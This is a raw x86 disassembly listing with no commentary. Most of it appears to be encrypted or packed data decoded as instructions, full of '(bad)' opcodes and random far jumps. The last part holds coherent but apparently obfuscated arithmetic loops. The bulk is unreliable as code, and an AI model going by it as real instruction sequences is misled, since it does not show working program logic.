  415d40:	jmp    DWORD PTR [esi+0x2e]
  415d43:	sbb    dh,BYTE PTR ds:0x69cb3ced
  415d49:	(bad)  
  415d4a:	jo     0x415ccc
  415d4c:	adc    al,0x95
  415d4e:	mov    esi,DWORD PTR [eax+0x305317f0]
  415d54:	sbb    DWORD PTR [ebx],esi
  415d56:	mov    esp,ebp
  415d58:	pop    ss
  415d59:	adc    DWORD PTR [ecx],ebp
  415d5b:	push   DWORD PTR [ebx]
  415d5d:	nop
  415d5e:	inc    esi
  415d5f:	xor    DWORD PTR [esi],esp
  415d61:	enter  0xb730,0x20
  415d65:	inc    esi
  415d66:	hlt    
  415d67:	fdiv   QWORD PTR [edx-0xc]
  415d6a:	sub    BYTE PTR [ebx-0x2b126be],0x66
  415d71:	loope  0x415d66
  415d73:	in     al,dx
  415d74:	cs sbb bh,ch
  415d77:	fwait
  415d78:	shr    BYTE PTR [ebx-0x7],cl
  415d7b:	push   esp
  415d7c:	sbb    al,0xf6
  415d7e:	adc    al,ch
  415d80:	stos   DWORD PTR es:[edi],eax
  415d81:	(bad)  
  415d82:	and    dl,BYTE PTR [edx]
  415d84:	repnz cs sbb eax,0x72311c92
  415d8b:	jecxz  0x415d13
  415d8d:	rdpmc  
  415d8f:	jecxz  0x415e07
  415d91:	xchg   ebp,eax
  415d92:	and    esp,DWORD PTR [esi]
  415d94:	xchg   ecx,eax
  415d95:	xlat   BYTE PTR ds:[ebx]
  415d96:	pusha  
  415d97:	pop    edi
  415d98:	or     BYTE PTR [ebp+0x75],0x1
  415d9c:	(bad)
  415da0:	stos   DWORD PTR es:[edi],eax
  415da1:	jg     0x415d58
  415da3:	or     cl,BYTE PTR [esi]
  415da5:	(bad)  
  415da6:	mov    ebx,0x338e8708
  415dab:	inc    ecx
  415dac:	push   edx
  415dad:	mov    eax,ds:0xbcf4e98b
  415db2:	jmp    esi
  415db4:	jmp    0x50a1:0xf240780
  415dbb:	(bad)  
  415dbc:	cdq    
  415dbd:	push   ss
  415dbe:	mov    cs,ecx
  415dc0:	xchg   ecx,eax
  415dc1:	inc    esp
  415dc2:	retf   0x8ffb
  415dc5:	icebp  
  415dc6:	test   DWORD PTR [esi-0x61],edx
  415dc9:	sahf   
  415dca:	jmp    0x415d94
  415dcc:	inc    ecx
  415dcd:	in     eax,dx
  415dce:	ret    
  415dcf:	mov    ds:0x3058c36b,al
  415dd4:	loope  0x415de6
  415dd6:	int3   
  415dd7:	ins    BYTE PTR es:[edi],dx
  415dd8:	out    dx,eax
  415dd9:	jle    0x415dc8
  415ddb:	add    ebp,DWORD PTR [eax]
  415ddd:	pop    es
  415dde:	add    DWORD PTR [ebx],ebp
  415de0:	xchg   esi,eax
  415de1:	pop    es
  415de2:	lods   al,BYTE PTR ds:[esi]
  415de3:	push   ecx
  415de4:	sar    edi,0xfb
  415de7:	mov    cl,0x4
  415de9:	inc    edi
  415dea:	push   ecx
  415deb:	adc    esp,DWORD PTR [edx+0x3280f51f]
  415df1:	pop    esi
  415df2:	cdq    
  415df3:	or     esp,DWORD PTR [ebx-0xb]
  415df6:	or     edx,DWORD PTR [edx]
  415df8:	clc    
  415df9:	lds    edx,FWORD PTR [edx+edx*4-0xe80bb8e]
  415e00:	mov    esi,0x19c4c030
  415e05:	loopne 0x415e35
  415e07:	push   eax
  415e08:	push   ebx
  415e09:	jne    0x415e76
  415e0b:	mov    edx,0x341a24f6
  415e10:	pop    ebp
  415e11:	(bad)  
  415e12:	pop    ds
  415e13:	xchg   DWORD PTR [ecx],edi
  415e15:	sbb    bh,BYTE PTR [esi-0x67866d25]
  415e1b:	imul   ebp,ecx,0x45
  415e1e:	ins    DWORD PTR es:[edi],dx
  415e1f:	cwde   
  415e20:	(bad)  
  415e21:	data16 js 0x415e53
  415e24:	pop    eax
  415e25:	push   esp
  415e26:	cmp    BYTE PTR [eax-0x13892c2d],dl
  415e2c:	mov    dl,BYTE PTR [eax-0x2478a535]
  415e32:	push   esi
  415e33:	mov    dl,0x4d
  415e35:	sub    edi,ebp
  415e37:	add    DWORD PTR [ebx-0x1a],0xb171ba41
  415e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e3f:	mov    BYTE PTR [ecx+eiz*2+0x6a16567a],ch
  415e46:	in     eax,dx
  415e47:	or     edx,DWORD PTR [ebp+0x65593d05]
  415e4d:	or     esp,esp
  415e4f:	add    BYTE PTR [edi],ch
  415e51:	push   edx
  415e52:	pop    ds
  415e53:	aaa    
  415e54:	mov    ecx,0xec93dd0d
  415e59:	and    ebp,DWORD PTR [esi]
  415e5b:	fsubr  DWORD PTR [edi+0x64b4ab99]
  415e61:	pop    ebx
  415e62:	mov    al,0x33
  415e64:	aaa    
  415e65:	xchg   edx,eax
  415e66:	ja     0x415ea6
  415e68:	pop    edx
  415e69:	dec    esp
  415e6a:	jae    0x415e9f
  415e6c:	into   
  415e6d:	cld    
  415e6e:	mov    dl,0x6a
  415e70:	les    edx,FWORD PTR [edx+0x34]
  415e73:	js     0x415ee4
  415e75:	scas   al,BYTE PTR es:[edi]
  415e76:	es mov ch,0x17
  415e79:	inc    eax
  415e7a:	mov    al,ds:0x990ab721
  415e7f:	adc    BYTE PTR [ebx+0x1c],al
  415e82:	out    dx,al
  415e83:	leave  
  415e84:	inc    esi
  415e85:	jmp    0x5a8c:0x2a585376
  415e8c:	xchg   ebx,eax
  415e8d:	fwait
  415e8e:	std    
  415e8f:	cmp    DWORD PTR [ebx+esi*4],edx
  415e92:	std    
  415e93:	sbb    DWORD PTR [eax],eax
  415e95:	test   al,0xd6
  415e97:	lods   eax,DWORD PTR ds:[esi]
  415e98:	add    dl,ch
  415e9a:	ret    0xe59d
  415e9d:	ds xchg ebx,eax
  415e9f:	fnstcw WORD PTR [ebp-0x2e312f49]
  415ea5:	ins    DWORD PTR es:[edi],dx
  415ea6:	xor    al,0x4f
  415ea8:	xor    ebp,edx
  415eaa:	hlt    
  415eab:	aad    0xb
  415ead:	adc    cl,BYTE PTR [eax+ecx*8+0x28]
  415eb1:	(bad)  [edx+eax*1-0x77]
  415eb5:	push   0xc2a456fd
  415eba:	cmc    
  415ebb:	fmul   QWORD PTR [esi-0x3211c2bf]
  415ec1:	fisub  DWORD PTR [ecx-0x659b9963]
  415ec7:	(bad)  
  415ec8:	and    al,0x3f
  415eca:	add    DWORD PTR [ebx-0x7e9d69df],ebp
  415ed0:	push   edx
  415ed1:	push   edx
  415ed2:	add    al,0xaa
  415ed4:	xchg   ecx,eax
  415ed5:	jno    0x415ec7
  415ed7:	aas    
  415ed8:	or     eax,0xc322e358
  415edd:	fwait
  415ede:	add    eax,0x5864228
  415ee3:	out    dx,eax
  415ee4:	ss pop ss
  415ee6:	ret    0xb2d5
  415ee9:	in     eax,dx
  415eea:	xor    DWORD PTR [edi+ebx*4-0x39e30a4],esi
  415ef1:	pop    esi
  415ef2:	stc    
  415ef3:	push   0x830b66c3
  415ef8:	add    dh,al
  415efa:	es xor ebx,DWORD PTR cs:[esi-0x11]
  415eff:	(bad)  
  415f00:	ds mov ebp,0x23aa4bae
  415f06:	jl     0x415eda
  415f08:	jmp    0x415f33
  415f0a:	cmp    edx,edi
  415f0c:	daa    
  415f0d:	fcomp  DWORD PTR [ebx+0xa]
  415f10:	mov    bh,0xe0
  415f12:	cmp    eax,0x2fdcee46
  415f17:	in     al,dx
  415f18:	mov    WORD PTR [edi+0x2],fs
  415f1b:	ret    0x9880
  415f1e:	iret   
  415f1f:	test   eax,0xfc53d400
  415f24:	add    al,0x7
  415f26:	mov    al,0xb0
  415f28:	popa   
  415f29:	hlt    
  415f2a:	push   ss
  415f2b:	mov    ebx,0x121fca6b
  415f30:	call   0x388c:0x93ec37cb
  415f37:	bound  ebx,QWORD PTR [ebx-0x42722b69]
  415f3d:	das    
  415f3e:	dec    ebx
  415f3f:	lods   al,BYTE PTR ds:[esi]
  415f40:	lahf   
  415f41:	les    ecx,FWORD PTR [ecx]
  415f43:	int    0x16
  415f45:	cmp    BYTE PTR [ebx-0x3ecac0e1],ch
  415f4b:	mov    DWORD PTR [edi],0xd45f3983
  415f51:	cmp    eax,0x14e7822c
  415f56:	lahf   
  415f57:	neg    DWORD PTR [ebx-0x24af5235]
  415f5d:	adc    ebx,DWORD PTR [edx-0x2f85097d]
  415f63:	std    
  415f64:	out    dx,eax
  415f65:	add    BYTE PTR [edx+0x53],ah
  415f68:	(bad)
  415f6c:	push   0xffffffbf
  415f6e:	or     DWORD PTR [ebp-0x5b],esi
  415f71:	mov    DWORD PTR [eax],ebp
  415f73:	dec    esp
  415f74:	cmc    
  415f75:	rol    eax,0x4
  415f78:	mov    esi,0x5f5ea61e
  415f7d:	sub    DWORD PTR [ebx+0x5d],edx
  415f80:	xchg   edx,eax
  415f81:	sub    edx,DWORD PTR [ecx+0x7c46c95a]
  415f87:	mov    cl,0x7
  415f89:	dec    esi
  415f8a:	xchg   esi,eax
  415f8b:	pop    ebx
  415f8c:	icebp  
  415f8d:	pop    eax
  415f8e:	mov    bl,0x1a
  415f90:	fisttp WORD PTR [edi-0x4c9a5f87]
  415f96:	mov    bl,0xb7
  415f98:	ins    BYTE PTR es:[edi],dx
  415f99:	sbb    ch,BYTE PTR [ebp+0x66]
  415f9c:	push   esp
  415f9d:	xor    al,BYTE PTR [esi]
  415f9f:	sahf   
  415fa0:	das    
  415fa1:	clc    
  415fa2:	pop    ss
  415fa3:	hlt    
  415fa4:	pop    eax
  415fa5:	xchg   ebx,eax
  415fa6:	mov    ds:0xb425ff72,al
  415fab:	(bad)  
  415fac:	ret    0x870a
  415faf:	aam    0xee
  415fb1:	mov    ds:0xa3122452,al
  415fb6:	ror    BYTE PTR [eax],0xad
  415fb9:	push   es
  415fba:	push   ebx
  415fbb:	retf   
  415fbc:	mov    ah,0xd7
  415fbe:	lods   al,BYTE PTR ds:[esi]
  415fbf:	dec    esp
  415fc0:	pop    edi
  415fc1:	jnp    0x416017
  415fc3:	sbb    edx,eax
  415fc5:	(bad)  
  415fc6:	in     al,0xc1
  415fc8:	sbb    al,0xb0
  415fca:	sbb    al,0x48
  415fcc:	jmp    FWORD PTR [ebp-0x1daca864]
  415fd2:	mov    bl,0x96
  415fd4:	(bad)  
  415fd5:	es popa 
  415fd7:	(bad)  
  415fd8:	aas    
  415fd9:	sbb    edi,DWORD PTR [eax+0x4d]
  415fdc:	test   ebx,eax
  415fde:	inc    ebp
  415fdf:	dec    edx
  415fe0:	fisubr DWORD PTR [eax-0x50]
  415fe3:	jl     0x415fd3
  415fe5:	es idiv edx
  415fe8:	cld    
  415fe9:	fbld   TBYTE PTR [edi+0x37]
  415fec:	sbb    BYTE PTR [esi],cl
  415fee:	pop    esi
  415fef:	add    BYTE PTR [eax],ah
  415ff1:	inc    DWORD PTR [edi+0x62]
  415ff4:	inc    BYTE PTR [edx+0x1c778a68]
  415ffa:	sbb    ebx,DWORD PTR [esp+ebp*1+0x69]
  415ffe:	push   0x1
  416000:	out    dx,eax
  416001:	xlat   BYTE PTR ds:[ebx]
  416002:	adc    eax,0xe072cc8b
  416007:	repz sub DWORD PTR [edx+eiz*8+0x11],esp
  41600c:	int    0x70
  41600e:	mov    DWORD PTR cs:[edx-0x35715e59],ebx
  416015:	adc    DWORD PTR ds:0xbf641fb5,0x72
  41601c:	push   edi
  41601d:	fisubr DWORD PTR [ebp+0x6da56c18]
  416023:	retf   0xa26b
  416026:	and    al,0x3b
  416028:	rcr    BYTE PTR [esi],cl
  41602a:	leave  
  41602b:	cdq    
  41602c:	iret   
  41602d:	inc    edx
  41602e:	xor    BYTE PTR [ebp-0x29928656],ch
  416034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416035:	scas   eax,DWORD PTR es:[edi]
  416036:	aam    0x6f
  416038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416039:	fwait
  41603a:	daa    
  41603b:	fs mov esp,0x450b2685
  416041:	fld    QWORD PTR [edi]
  416043:	fwait
  416044:	xor    DWORD PTR [ebp-0x60],esp
  416047:	and    dl,al
  416049:	clc    
  41604a:	mov    edi,0x2f753735
  41604f:	mov    al,0x35
  416051:	dec    edx
  416052:	jge    0x41609c
  416054:	imul   eax,DWORD PTR [ecx],0xffffffe6
  416057:	dec    edi
  416058:	add    ebx,DWORD PTR [eax]
  41605a:	stos   DWORD PTR es:[edi],eax
  41605b:	cld    
  41605c:	cmp    esi,ebx
  41605e:	mov    al,ds:0xa972e37b
  416063:	fsubr  DWORD PTR [edx+0x48524ee1]
  416069:	dec    eax
  41606a:	jp     0x4160d1
  41606c:	and    ecx,ecx
  41606e:	in     al,dx
  41606f:	xchg   esp,eax
  416070:	mov    ebx,0xa71b7c19
  416075:	xchg   edi,eax
  416076:	loope  0x416055
  416078:	adc    edi,DWORD PTR [esi+0x6b]
  41607b:	mov    ch,0x2b
  41607d:	sbb    BYTE PTR [ecx+0x4481af35],dh
  416083:	add    ebp,esi
  416085:	cmp    al,0x4c
  416087:	mov    al,0x52
  416089:	sbb    al,cl
  41608b:	sar    BYTE PTR [eax],1
  41608d:	scas   eax,DWORD PTR es:[edi]
  41608e:	jns    0x41608b
  416090:	and    DWORD PTR ss:[ecx],eax
  416093:	mov    esi,ebp
  416095:	and    DWORD PTR [edi+0x20],0xfd4204cb
  41609c:	add    al,0xce
  41609e:	mov    eax,0xd437da1f
  4160a3:	clc    
  4160a4:	fistp  QWORD PTR [edx-0xffae288]
  4160aa:	push   ss
  4160ab:	ins    BYTE PTR es:[edi],dx
  4160ac:	loope  0x41611a
  4160ae:	mov    eax,0xc26cf9bf
  4160b3:	stos   BYTE PTR es:[edi],al
  4160b4:	mov    edx,0x14c988bc
  4160b9:	jb     0x4160c8
  4160bb:	(bad)  [esi]
  4160bd:	inc    eax
  4160be:	inc    ebx
  4160bf:	cmp    DWORD PTR [ecx],0xffffffbb
  4160c2:	sub    al,0x52
  4160c4:	pusha  
  4160c5:	in     al,0xcd
  4160c7:	adc    bh,BYTE PTR [edx]
  4160c9:	xor    bh,BYTE PTR [esi+0x6df01aae]
  4160cf:	mov    edx,0x17fcafc8
  4160d4:	mov    eax,0xa8ab1976
  4160d9:	in     eax,0xa3
  4160db:	es or  al,0x81
  4160de:	sbb    edi,DWORD PTR [esi]
  4160e0:	pusha  
  4160e1:	push   0xc008556d
  4160e6:	dec    eax
  4160e7:	jns    0x416070
  4160e9:	mov    ecx,0xffd490e8
  4160ee:	jae    0x41613a
  4160f0:	xchg   ebx,eax
  4160f2:	mov    al,ds:0x464bb92b
  4160f7:	(bad)  
  4160f8:	stc    
  4160f9:	push   eax
  4160fa:	xlat   BYTE PTR ds:[ebx]
  4160fb:	out    0x88,eax
  4160fd:	cld    
  4160fe:	pusha  
  4160ff:	adc    al,ah
  416101:	cmc    
  416102:	xchg   esp,eax
  416103:	push   ds
  416104:	pop    esp
  416105:	inc    esi
  416106:	scas   eax,DWORD PTR es:[edi]
  416107:	sub    bh,BYTE PTR [ebx+0x26]
  41610a:	fistp  DWORD PTR cs:[edi+0x2c291b7e]
  416111:	shl    DWORD PTR [esi+0x4486b6c1],0x3
  416118:	xor    al,0x89
  41611b:	pusha  
  41611c:	mov    edx,0x5ffe62d6
  416121:	pop    ds
  416122:	add    DWORD PTR [ebp+0x584ca30c],ebx
  416128:	push   edi
  416129:	fisttp WORD PTR [ebx+0x1dede44d]
  41612f:	(bad)  
  416130:	fild   WORD PTR [esi-0x11ccd771]
  416136:	xchg   DWORD PTR [eax-0x1f],ebx
  416139:	xchg   DWORD PTR [ecx+0x6ed8166],edx
  41613f:	shr    bl,0x62
  416142:	sar    DWORD PTR [edx-0x7c],cl
  416145:	pushf  
  416146:	sbb    bl,BYTE PTR [eax]
  416148:	add    bh,BYTE PTR [esi-0x3e]
  41614b:	lods   eax,DWORD PTR ds:[esi]
  41614c:	stos   BYTE PTR es:[edi],al
  41614d:	adc    ebx,ebp
  41614f:	stc    
  416150:	rcr    DWORD PTR [esi-0x6b6eef7c],0x14
  416157:	pop    edx
  416158:	int    0x26
  41615a:	and    eax,0x1eaed370
  41615f:	cmp    eax,0xcb49b2ef
  416164:	into   
  416165:	loope  0x416112
  416167:	mov    bh,0xb1
  416169:	sbb    BYTE PTR [eax],0x99
  41616c:	xchg   BYTE PTR [ecx],al
  41616e:	iret   
  41616f:	adc    DWORD PTR [ebx+eiz*1+0x59b352b],eax
  416176:	jbe    0x416135
  416178:	add    BYTE PTR [ebx+0x6e],bh
  41617b:	adc    BYTE PTR ds:0x1fc9c34e,0xb4
  416182:	fbld   TBYTE PTR [esi+0x75]
  416185:	out    0x42,eax
  416187:	(bad)  
  416188:	iret   
  416189:	int3   
  41618a:	loopne 0x41615d
  41618c:	and    ch,al
  41618e:	or     eax,0x1b87ac2f
  416193:	pushf  
  416194:	add    BYTE PTR [edi+0x7e],ch
  416197:	(bad)  
  416199:	cld    
  41619a:	dec    edi
  41619b:	sbb    al,0x63
  41619d:	in     eax,dx
  41619e:	mov    edi,0xe003e42
  4161a3:	shr    BYTE PTR [esi],0xb5
  4161a6:	adc    ah,dh
  4161a8:	mov    ecx,0x3054811f
  4161ad:	jge    0x4161ef
  4161af:	pop    esp
  4161b0:	dec    ecx
  4161b1:	stos   DWORD PTR es:[edi],eax
  4161b2:	push   ecx
  4161b3:	ret    
  4161b4:	or     DWORD PTR gs:[edi+0x30],esp
  4161b8:	in     al,0x86
  4161ba:	enter  0xb010,0x7c
  4161be:	inc    ebp
  4161bf:	xchg   BYTE PTR [esi],ah
  4161c1:	stos   BYTE PTR es:[edi],al
  4161c2:	mov    ch,0x5b
  4161c4:	lods   al,BYTE PTR ds:[esi]
  4161c5:	mov    dh,0x1
  4161c7:	push   edx
  4161c8:	pop    edi
  4161c9:	(bad)  
  4161ca:	mov    edx,0xd20192b2
  4161cf:	fsubr  DWORD PTR [ebx+0x54]
  4161d2:	push   esp
  4161d3:	mov    DWORD PTR [esi+0x6a700c81],edi
  4161d9:	out    0xdf,al
  4161db:	xchg   ebx,eax
  4161dc:	dec    esp
  4161dd:	pop    ss
  4161de:	je     0x416160
  4161e0:	in     al,0xec
  4161e2:	pop    ds
  4161e3:	adc    DWORD PTR [edx],0x7d
  4161e6:	or     BYTE PTR [ebp-0x76],bl
  4161e9:	(bad)  
  4161ea:	fdivr  st,st(3)
  4161ec:	vpackssdw ymm6,ymm2,YMMWORD PTR [esi]
  4161f0:	mov    bh,BYTE PTR [eax-0xd]
  4161f3:	sbb    DWORD PTR [ebp+0x66],0x25885ae4
  4161fa:	adc    DWORD PTR [ecx-0x19bee971],ebx
  416200:	push   edx
  416201:	fdivr  st(6),st
  416203:	lods   eax,DWORD PTR ds:[esi]
  416204:	rol    BYTE PTR [eax+0x27796fd3],0x28
  41620b:	pop    ecx
  41620c:	bound  ebx,QWORD PTR [ecx]
  41620e:	jp     0x4161cc
  416210:	sbb    DWORD PTR [ebx+0x20],ecx
  416213:	mov    esi,0xcdb3711c
  416218:	jmp    0xb2ac901d
  41621d:	repnz pop ebx
  41621f:	out    0x6c,al
  416221:	jmp    0xb66d:0x9dc2f3
  416228:	and    DWORD PTR [edi],ebp
  41622a:	test   al,0x9a
  41622c:	cmp    al,0xc3
  41622e:	add    bh,BYTE PTR [ecx-0x24]
  416231:	pop    esp
  416232:	and    BYTE PTR [eax+0x63],bl
  416235:	aad    0x5a
  416237:	jg     0x4162b5
  416239:	sbb    ecx,DWORD PTR [esi-0x7b]
  41623c:	popaw  
  41623e:	(bad)  
  41623f:	mov    ebp,0xbe28cdfe
  416244:	adc    DWORD PTR [ecx+0x29],eax
  416247:	add    ah,0x9e
  41624a:	dec    eax
  41624b:	mov    bh,0x7a
  41624d:	jl     0x4161ec
  41624f:	(bad)  
  416250:	mov    eax,cr6
  416253:	(bad)  
  416256:	das    
  416257:	mov    ch,0x16
  416259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41625a:	dec    edx
  41625b:	or     ch,bh
  41625d:	sub    DWORD PTR [esi+edi*4],edx
  416260:	fld    TBYTE PTR [esi+0xa3d5b2d]
  416266:	out    0x3a,al
  416268:	retf   
  416269:	ja     0x416284
  41626b:	mov    DWORD PTR [ecx],edx
  41626d:	xchg   edi,eax
  41626e:	lea    ecx,[ecx-0x34]
  416271:	(bad)  [ebp-0x3dc5350e]
  416277:	mov    esi,0xab64d41a
  41627c:	xor    bh,0x45
  41627f:	call   0xc86d:0x703374c8
  416286:	sbb    BYTE PTR [edi+esi*2+0x4],0xa1
  41628b:	icebp  
  41628c:	test   ch,dl
  41628e:	fcmovb st,st(1)
  416290:	neg    BYTE PTR [ebp-0x3b]
  416293:	cmp    eax,0x6036e4a7
  416298:	xor    BYTE PTR [ebx-0x43],ah
  41629b:	mov    gs,WORD PTR [ecx]
  41629d:	mov    bl,0x2c
  41629f:	or     DWORD PTR ds:0x74b5fe22,ebp
  4162a5:	xchg   edx,eax
  4162a6:	data16 std 
  4162a8:	pop    esi
  4162a9:	ret    0xac10
  4162ac:	mov    edx,0xf1a87e77
  4162b1:	push   0x65a054f5
  4162b6:	mov    ds:0xce20e92,al
  4162bb:	adc    al,0x2c
  4162bd:	jle    0x41627f
  4162bf:	push   esp
  4162c0:	and    eax,0x73d3fc60
  4162c5:	pop    esp
  4162c6:	int    0x6
  4162c8:	pop    es
  4162c9:	out    dx,al
  4162ca:	mov    ebx,0xdb666ee
  4162cf:	add    esi,ecx
  4162d1:	xchg   edi,eax
  4162d2:	dec    edx
  4162d3:	inc    ebp
  4162d4:	fist   WORD PTR [esi]
  4162d6:	lds    eax,FWORD PTR [ebp+0x6c]
  4162d9:	xor    edx,0xffffff8d
  4162dc:	in     al,dx
  4162dd:	mov    WORD PTR [edx+0x1],cs
  4162e0:	push   ebp
  4162e1:	fcomp  DWORD PTR [ecx+0x59]
  4162e4:	fist   WORD PTR [eax]
  4162e6:	jp     0x416363
  4162e8:	ins    BYTE PTR es:[edi],dx
  4162e9:	(bad)  [esi+0x1be10890]
  4162ef:	or     eax,DWORD PTR [edi-0x1b]
  4162f2:	xchg   ebp,eax
  4162f3:	mov    eax,0x8459a94e
  4162f8:	int    0xf5
  4162fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162fb:	loopne 0x41628b
  4162fd:	mov    edi,0xf281ceb
  416302:	test   esi,ecx
  416304:	push   esi
  416305:	rcr    ch,0xe8
  416308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416309:	cmp    al,BYTE PTR [edi+0x42]
  41630c:	push   cs
  41630d:	push   0xffffffc8
  41630f:	cmp    DWORD PTR [edi],edi
  416311:	or     al,0x58
  416313:	mov    ebp,0xaf437c64
  416318:	jo     0x416393
  41631a:	dec    esi
  41631b:	mov    ebx,0x6aa6cc4b
  416320:	mov    ch,0x1e
  416322:	sub    edx,esi
  416324:	data16 out 0x5d,al
  416327:	or     ecx,DWORD PTR [ebx+0x5d420860]
  41632d:	inc    eax
  41632e:	imul   eax,ecx,0x38
  416331:	ficomp WORD PTR cs:[ebp-0x20aa142d]
  416338:	inc    esp
  416339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41633a:	mov    cl,0x75
  41633c:	or     edi,esp
  41633e:	push   cs
  41633f:	push   ecx
  416340:	and    eax,0x4abde6b9
  416345:	(bad)  
  416346:	test   al,0x68
  416348:	add    DWORD PTR [edx+0x27],ebx
  41634b:	and    al,0x14
  41634d:	pop    esi
  41634e:	retf   0x6062
  416351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416352:	test   edi,ebx
  416354:	pop    edi
  416355:	test   DWORD PTR [ebx],edx
  416357:	leave  
  416358:	push   ecx
  416359:	pop    esi
  41635a:	and    ch,bl
  41635c:	mov    bh,dl
  41635e:	mov    ecx,0x5d08ce82
  416363:	loop   0x416301
  416365:	cmp    eax,0xff664f00
  41636a:	js     0x416358
  41636c:	or     eax,0x59ffb520
  416371:	dec    ebp
  416372:	push   ebx
  416373:	jmp    0x53801daa
  416378:	inc    edi
  416379:	dec    edx
  41637a:	jne    0x4163fa
  41637c:	xchg   ebx,eax
  41637d:	inc    edx
  41637e:	les    ebx,FWORD PTR [ecx-0x14]
  416381:	or     BYTE PTR [esi+0x70],bl
  416384:	xor    ebx,DWORD PTR [esi]
  416386:	mov    ch,0x67
  416388:	in     al,0xa6
  41638a:	or     ah,BYTE PTR [esi]
  41638c:	ins    DWORD PTR es:[edi],dx
  41638d:	call   0x9c7e:0x73dae594
  416394:	mov    dl,0x7e
  416396:	mov    ds:0xa294d557,al
  41639b:	xchg   ebx,eax
  41639c:	test   eax,0x6b1fac66
  4163a1:	adc    eax,0xc28dbd7c
  4163a6:	jecxz  0x4163d8
  4163a8:	pushf  
  4163a9:	mov    ebp,0xeea90b98
  4163ae:	call   0x32d6:0x32cc7131
  4163b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163b6:	sub    ebx,edx
  4163b8:	add    ebx,DWORD PTR [ebp-0x44]
  4163bb:	mov    DWORD PTR [ebp-0x44],ebx
  4163be:	mov    edx,DWORD PTR [ebp+0x8]
  4163c1:	xor    edx,eax
  4163c3:	add    edx,esi
  4163c5:	jne    0x413f9a
  4163cb:	mov    edx,DWORD PTR [ebp-0x8]
  4163ce:	mov    ebx,DWORD PTR [ebp-0xc]
  4163d1:	xor    edx,eax
  4163d3:	lea    edx,[edx+ebx*1+0x3272e2]
  4163da:	mov    DWORD PTR [ebp-0xc],edx
  4163dd:	mov    edx,DWORD PTR [ebp-0x10]
  4163e0:	xor    edx,eax
  4163e2:	add    edx,esi
  4163e4:	jne    0x40f3d9
  4163ea:	jmp    0x416501
  4163ef:	mov    ecx,DWORD PTR [ebp-0x14]
  4163f2:	mov    DWORD PTR [ebp+0x8],ecx
  4163f5:	jmp    0x41646e
  4163fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4163fd:	mov    edx,DWORD PTR [ebp-0x8]
  416400:	xor    ecx,eax
  416402:	xor    edx,eax
  416404:	sub    ecx,edx
  416406:	sub    ecx,esi
  416408:	xor    ecx,eax
  41640a:	mov    DWORD PTR [ebp+0x8],ecx
  41640d:	mov    ecx,DWORD PTR [ebp+0x8]
  416410:	mov    edx,DWORD PTR [ebp-0x58]
  416413:	add    ecx,0x5708c4
  416419:	imul   ecx,edx
  41641c:	mov    DWORD PTR [ebp-0x58],ecx
  41641f:	mov    ecx,DWORD PTR [ebp+0x8]
  416422:	mov    edx,DWORD PTR [ebp-0x54]
  416425:	add    ecx,0x64f8da
  41642b:	or     ecx,edx
  41642d:	mov    DWORD PTR [ebp-0x54],ecx
  416430:	mov    ecx,DWORD PTR [ebp+0x8]
  416433:	mov    edx,DWORD PTR [ebp-0x50]
  416436:	add    ecx,0x242ebe9
  41643c:	xor    ecx,edx
  41643e:	mov    DWORD PTR [ebp-0x50],ecx
  416441:	mov    ecx,DWORD PTR [ebp+0x8]
  416444:	mov    edx,DWORD PTR [ebp-0x4c]
  416447:	add    ecx,edi
  416449:	and    ecx,edx
  41644b:	mov    DWORD PTR [ebp-0x4c],ecx
  41644e:	mov    ecx,DWORD PTR [ebp+0x8]
  416451:	mov    edx,DWORD PTR [ebp-0x48]
  416454:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41645b:	mov    DWORD PTR [ebp-0x48],ecx
  41645e:	mov    ecx,DWORD PTR [ebp+0x8]
  416461:	mov    edx,0xfa5e15e2
  416466:	sub    edx,ecx
  416468:	add    edx,DWORD PTR [ebp-0x44]
  41646b:	mov    DWORD PTR [ebp-0x44],edx
  41646e:	mov    ecx,DWORD PTR [ebp+0x8]
  416471:	xor    ecx,eax
  416473:	add    ecx,esi
  416475:	jne    0x4163fa
  41647b:	jmp    0x41650d
  416480:	mov    ecx,DWORD PTR [ebp+0x8]
  416483:	mov    edx,DWORD PTR [ebp-0x8]
  416486:	xor    ecx,eax
  416488:	xor    edx,eax
  41648a:	sub    ecx,edx
  41648c:	sub    ecx,esi
  41648e:	xor    ecx,eax
  416490:	mov    DWORD PTR [ebp+0x8],ecx
  416493:	mov    ecx,DWORD PTR [ebp+0x8]
  416496:	mov    edx,DWORD PTR [ebp-0x58]
  416499:	add    ecx,0x5708c4
  41649f:	imul   ecx,edx
  4164a2:	mov    DWORD PTR [ebp-0x58],ecx
  4164a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4164a8:	mov    edx,DWORD PTR [ebp-0x54]
  4164ab:	add    ecx,0x64f8da
  4164b1:	or     ecx,edx
  4164b3:	mov    DWORD PTR [ebp-0x54],ecx
  4164b6:	mov    ecx,DWORD PTR [ebp+0x8]
  4164b9:	mov    edx,DWORD PTR [ebp-0x50]
  4164bc:	add    ecx,0x242ebe9
  4164c2:	xor    ecx,edx
  4164c4:	mov    DWORD PTR [ebp-0x50],ecx
  4164c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4164ca:	mov    edx,DWORD PTR [ebp-0x4c]
  4164cd:	add    ecx,edi
  4164cf:	and    ecx,edx
  4164d1:	mov    DWORD PTR [ebp-0x4c],ecx
  4164d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164d7:	mov    edx,DWORD PTR [ebp-0x48]
  4164da:	lea    ecx,[edx+ecx*1+0x241fc1f]
  4164e1:	mov    DWORD PTR [ebp-0x48],ecx
  4164e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164e7:	mov    edx,0xfa5e15e2
  4164ec:	sub    edx,ecx
  4164ee:	add    edx,DWORD PTR [ebp-0x44]
  4164f1:	mov    DWORD PTR [ebp-0x44],edx
  4164f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164f7:	xor    ecx,eax
  4164f9:	add    ecx,esi
  4164fb:	jne    0x416480
